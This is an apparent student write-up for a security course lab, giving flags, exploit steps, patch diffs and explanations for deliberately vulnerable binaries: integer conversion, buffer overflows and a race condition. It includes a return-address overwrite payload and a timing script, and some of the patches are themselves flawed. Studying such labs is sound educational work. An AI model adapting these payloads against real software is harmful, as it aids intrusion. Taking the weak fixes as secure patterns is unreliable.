# Start Here

`Name`: Michael Norris  
`NetID`: mbn0208

For each problem below, you will,

1. Fill in the the flag
2. List the steps necessary to exploit the binary. *(May be a single line.)*
3. Provide a patch that fixes the exploit. *(Generated using `make diff`.)*
4. An explanation of what the vulnerability was and how the patch fixes it. *(Keep this explanation short and to the point.)*

---

## problem1

### Flag
flag{366-iNt3G3r5iGNc0nV3r5i0N}

### Exploit Steps
1. Run `./problem1`
2. Press 1 for a Withdrawal
3. Enter in `-1000000` as quantity

### Patch
```diff
--- .originals/problem1.c	2024-03-03 03:36:58.739761800 +0000
+++ problem1.c	2024-03-03 03:59:31.132149500 +0000
@@ -37,10 +37,17 @@
 
 // Handle a large withdraw
 void large_withdraw(struct user_account *u) {
-  unsigned int withdrawal;
+  int withdrawal;//make this signed, we don't want a negative withdrawal
 
   printf("How much would you like to withdraw?\n> ");
-  scanf("%u", &withdrawal);
+  scanf("%d", &withdrawal);
+  //check that the value entered is positive as well
+  if (withdrawal <= 0)
+  {
+    printf("Sorry, you must withdrawal a value greater than 0!\n");
+    return;
+  }
+
   withdrawal += 50;
 
   // Ensure the user has enough money to complete the transaction
```

### Explanation
The vulnerability is in the function `large_withdrawal`. User input was read as an `unsigned int`, yet when it was passed to the 
`update_account_balance` function it is converted back to an int, retaining the original value input by the user. This allows the user to input negative numbers and thus actually add money to their account balance, meaning they can trigger the functionality of `VIP`. This is patched by taking in an signed int to start and checking for negative input. If negative, the user is prompted to try again.

---

## problem2

### Flag
flag{366-bUFF3r0v3RF10w_r3turn}

### Exploit Steps
1. Run `objdump -d problem2` in order to find the address of the `backdoor` function
2. run the command `./problem2 $(python2 -c "print '00000000000000000000000000000000000000000000\x80\x92\x04\x08'")`

### Patch
```diff
--- .originals/problem2.c	2024-03-03 03:36:58.682302800 +0000
+++ problem2.c	2024-03-03 04:28:24.833653800 +0000
@@ -10,7 +10,7 @@
   char out[32];
 
   memset(out, 0, sizeof(out));
-  strcpy(out, input);
+  strncpy(out, input, 32);
 
   // Copy the user's input and print it out.
   printf("user:   %s\n", input);
```

### Explanation
The vulnerability is in the `strcpy` call in parrot. The buffer `out` is only allocated 32 bytes, but `strcpy` will read in bytes until it encounters a null terminator, even beyond the buffer into unallocated space. By overfilling this buffer, we are able to place bits into memory by adding input after 32 bits, in this case replacing the return address to `main` with the address of `backdoor`, calling backdoor and thus the flag. I fixed this by swapping `strcpy` with `strncpy` which stops reading input after a specified number of characters (in this case the buffer size).

---

## problem3

### Flag
flag{366-BufFeR0v3rf10W_C4n4ry}

### Exploit Steps
1. Enter the command `./problem3 00000000000000001111111111111111`

### Patch
```diff
--- .originals/problem3.c	2024-03-03 03:36:58.866855900 +0000
+++ problem3.c	2024-03-03 04:44:53.020021300 +0000
@@ -16,7 +16,7 @@
 
   // Check that the passwords match. We're using my super special comparison function that
   // shifts password characters over by 1... throws off the hackers!
-  strcpy(passwordBuffer, input);
+  strncpy(passwordBuffer, input, 16);
 
   for (size_t i = 0; i < sizeof(passwordBuffer); i++) {
     passwordBuffer[i]++;
```

### Explanation
The vulnerability is similar to problem2 in that it involves a buffer overflow. In this case the compiler stores `passwordBuffer` and `secret` right next to each other, so if we overflow `passwordBuffer` we can write our own data into `secret`. Because the inputted password is incremented by 1 and then compared to the password, we simply need to input 16 zeroes and then 16 1s to make the passwords match. This is patched by swapping `strcpy` for `strncpy` and capping input read to 16 characters.

---

## problem4

### Flag
flag{366-iNt3g3r0v3rF10w}

### Exploit Steps
1. run `./problem4`
2. Enter value `2147483396`
3. Enter value `2`

### Patch
```diff
--- .originals/problem4.c	2024-03-03 03:36:58.769884600 +0000
+++ problem4.c	2024-03-03 05:04:40.070931300 +0000
@@ -4,6 +4,8 @@
   printf("The flag goes here");
 }
 
+int calculationOverflow(int, int);
+
 // Do not change this value.
 static const int reset_key = -504;
 
@@ -31,6 +33,12 @@
     return -1;
   }
 
+  if (calculationOverflow(value, factor)) // calculationOverflow should return 1 if the expression has a negative result
+  {
+    printf("Invalid input. Multiplication overflows to negative value!\n");
+    return -1;
+  }
+
   result = value * factor;
 
   if (result == reset_key) {
@@ -40,4 +48,17 @@
   } else {
     printf("Product: %d\n", result);
   }
+
+}
+
+int calculationOverflow(int valA, int valB)
+{
+  if (valA * valB < 0)
+  {
+    return 1;
+  }
+  else
+  {
+    return 0;
+  }
 }
```

### Explanation
The vulnerability here is that if you multiply 2 number together and the result is larger than the integer limit, it will wrap around into negative values. We want to wrap around this result to equal the secret key, so we take the 32 bit integer limit and subtract half of the absolute value fo the rest key to get the value we need to wrap around by multiplying (`2,147,483,647-(504/2)`). Then add one because 2s complement signed integers have one more possible value on the positive side then negative. Multiplying this by 2 gives the secret key, and the patch is to simply check if the result of the multiplication is negative and return -1 if it is.

---

## problem5

### Flag
flag{366-r5C3c0nd170n}

### Exploit Steps
1. run `problem5-script.sh`

### problem5-script.sh

```
#! /bin/bash

./problem5 &
CHILD_PID=$!
FILENAME=/tmp/$CHILD_PID
sleep 0.04
touch $FILENAME
```

### Patch
```diff
+ --- .originals/problem5.c	2024-03-03 03:36:58.712023900 +0000
+++ problem5.c	2024-03-03 05:20:39.691211800 +0000
@@ -15,7 +15,7 @@
     printf("Hey, you shouldn't have access to my file... What are you trying to pull? Go away!\n");
   } else {
     // I'm tired. Checking access is hard work... I need some sleep. 0.1 seconds should do it.
-    usleep(100000);
+    //usleep(100000);
 
     // Ok, let's open this file and write the flag to it.
     // Haha... just kidding, the user doesn't have access to the file, so this call will fail.

```

### Explanation
This vulnerability is a race condition. If you are to create the allocated file during the 0.1 seconds of sleep, the file will not be null when the sleep finishes and you will be able to trigger the flag. By having a script run that waits .04 seconds after running the program I can create the file in that sleep. This is fixed simply by removing the sleep statement. This means that there is almost zero chance of exploiting the race condition because the file is opened right after it is allocated.

---

## problem6

### Flag
FLAG_GOES_HERE

### Exploit Steps
1. List your steps here

### Patch
```diff
+ Contents of ./diff/problem6.diff goes here
```

### Explanation
In your own words, write a couple sentences about why this code is vulnerable and how you fixed this vulnerability. *(Keep to 200 words or less; preferably much less.)*

---

## problem7

### Flag
FLAG_GOES_HERE

### Exploit Steps
1. List your steps here

### Patch
```diff
+ Contents of ./diff/problem7.diff goes here
```

### Explanation
In your own words, write a couple sentences about why this code is vulnerable and how you fixed this vulnerability. *(Keep to 200 words or less; preferably much less.)*

---
